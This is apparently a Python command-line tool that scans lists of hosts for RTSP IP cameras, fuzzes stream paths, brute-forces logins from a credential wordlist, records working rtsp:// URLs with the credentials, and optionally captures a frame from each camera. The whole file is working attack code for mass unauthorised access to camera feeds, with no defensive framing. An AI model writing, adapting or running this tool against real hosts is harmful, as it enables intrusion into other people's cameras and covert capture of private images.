#!/usr/bin/env python
"""Brute creds, fuzzing paths for RTSP cams.
See --help for options"""
from concurrent.futures import ThreadPoolExecutor as TPE
from functools import partial
import os
import re
import socket as so
import sys
from time import sleep

from fire import Fire

from lib.utils import dt, str_to_filename


status_re = re.compile(r'RTSP/\d\.\d (\d\d\d)')

hosts_file = None
rtsp_port = 554
host_threads = 64
path_threads = 2
brute_threads = 1
timeout = 5
verbose = 0
capture_image = False
interface = None

DIR = os.path.dirname(os.path.abspath(__file__))
LOCAL_DIR = os.path.join(DIR, 'local')
DATA_DIR = os.path.join(DIR, 'data')
CAPTURES_DIR = os.path.join(LOCAL_DIR, 'rtsp_captures')

# cam
C_FOUND = '@'
C_FAKE = '~'

# brute
C_OK = '+'
C_FAIL = '-'

# errors
C_REFUSED = 'x'
C_SLOW = 't'
C_RETRY = 'r'
C_FUC_UP = 'f'
C_NOT_RTSP = '?'
C_TMOF = '%'

C_CAP_OK = 'C'
C_CAP_ERR = '!'


def prg(t):
    if verbose >= 0:
        sys.stdout.write(t)
        sys.stdout.flush()


def capture(res):
    img_name = str_to_filename(res.split('://')[1])
    img_path = os.path.join(CAPTURES_DIR, f'{img_name}.jpg')

    try:
        from cv2 import VideoCapture, imwrite
        from numpy import ndarray
        vcap = VideoCapture(res)
        _, frame = vcap.read()
        if type(frame) != ndarray:
            return False
        else:
            imwrite(img_path, frame)
            return True

    except ImportError:
        import ffmpeg

        stream = ffmpeg.input(res, rtsp_transport='tcp')
        file = stream.output(img_path, vframes=1)

        try:
            file.run(capture_stdout=True, capture_stderr=True)
        except ffmpeg.Error as e:
            return False
        else:
            return True


def wrire_result(res: str):
    with open(os.path.join(LOCAL_DIR, 'rtsp.txt'), 'a') as f:
        f.write(f'[{dt()}] {res}\n')
    if capture_image:
        captured = capture(res)
        prg(C_CAP_OK if captured else C_CAP_ERR)


def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout: float = 3, iface=None):
    if cred:
        cred += '@'
    req = (
        f'DESCRIBE rtsp://{cred}{host}:{port}{path} RTSP/1.0\r\n'
        'CSeq: 2\r\n'
        '\r\n'
    )
    tries = 4
    while True:
        try:
            with so.socket() as s:
                s.settimeout(timeout)
                if iface:
                    s.setsockopt(
                        so.SOL_SOCKET, so.SO_BINDTODEVICE, iface.encode())
                s.connect((host, port))
                s.sendall(req.encode())
                response = s.recv(1024).decode()
                return int(status_re.findall(response)[0])
        except so.timeout:
            if verbose:
                prg(C_SLOW)
            break  # slowpoke, 3ff0ff
        except IOError as e:
            # 111 refused
            if e.errno == 111:
                if verbose:
                    prg(C_REFUSED)

                break

            # 104 reset by peer
            if e.errno == 104:
                if tries <= 0:
                    if verbose:
                        prg(C_FUC_UP)
                    break  # host f*ckup?
                sleep(2 / tries)
                tries -= 1
                if verbose > 1:
                    prg(C_RETRY)
                continue

            # too many open files
            if e.errno == 24:
                sleep(0.15)
                if verbose > 1:
                    prg(C_TMOF)
                continue
            break

        except KeyboardInterrupt:
            raise
        except IndexError:
            if verbose:
                prg(C_NOT_RTSP)
            break
        except Exception as e:
            # print('Unknown error:', e, 'please, contact with dev')
            return 418
    return 503


def check_cred(host, port, path, cred):
    code = rtsp_req(host, port, path, cred, timeout, interface)
    if code == 200:
        prg(C_OK)
        return f'rtsp://{cred}@{host}:{port}{path}'

    if code >= 500:
        prg(C_FAIL)
        return

    return ''


def check_path(host, port, path):
    code = rtsp_req(host, port, path, timeout=timeout, iface=interface)

    if code >= 500:
        prg(C_FAIL)
        return

    if code not in [200, 401, 403]:
        if verbose == 3:
            print('.', end='', flush=True)
        return ''

    with open(os.path.join(DATA_DIR, 'rtsp_creds.txt')) as f:
        creds = [ln.rstrip() for ln in f]

    ch = partial(check_cred, host, port, path)

    with TPE(brute_threads) as ex:
        for res in ex.map(ch, creds):
            if res is None:
                return
            if res:
                return res


def check_host(host):
    port = rtsp_port
    if ':' in host:
        host, port = host.split(':')
    ch = partial(check_path, host, int(port))

    with TPE(path_threads) as ex:
        with open(os.path.join(DATA_DIR, 'rtsp_paths.txt')) as f:
            paths = [ln.rstrip() for ln in f]

        for rr in ex.map(ch, paths):
            if rr is None:
                return

            if '0h84d' in rr:
                prg(C_FAKE)
                return

            if rr:
                prg(C_FOUND)
                wrire_result(rr)
                return rr  # first valid path is enough now


def main(hosts_file=None, port=554, t=5, ht=64, pt=2, bt=1, i=None, capture=False, v=0, s=False):
    """Brute creds, fuzzing paths for RTSP cams

    :param str hosts_file: File with lines ip:port or just ips
    :param int port: Default port to use if not specified in file
    :param int ht: Threads count for hosts
    :param int pt: Threads count for paths
    :param int bt: Threads count for brute
    :param str i: Network interface to use
    :param int v: Verbose level
    :param bool s: Silent mode
    """
    global rtsp_port
    global verbose
    global host_threads
    global path_threads
    global brute_threads
    global capture_image
    global timeout
    global interface

    rtsp_port = port
    host_threads = ht
    path_threads = pt
    brute_threads = bt
    capture_image = capture
    timeout = t
    interface = i

    verbose = v
    if s:
        verbose = -1

    if capture and not os.path.exists(CAPTURES_DIR):
        os.mkdir(CAPTURES_DIR)

    if not hosts_file:
        hosts_file = os.path.join(LOCAL_DIR, f'hosts_{rtsp_port}.txt')

    with open(hosts_file) as f:
        hosts = [ln.rstrip() for ln in f]

    with TPE(host_threads) as ex:
        results = ex.map(check_host, hosts)
        if verbose >= 0:
            for res in list(results):
                if res:
                    print(res)
        else:
            for res in results:
                if res:
                    print(res)


if __name__ == "__main__":
    Fire(main)
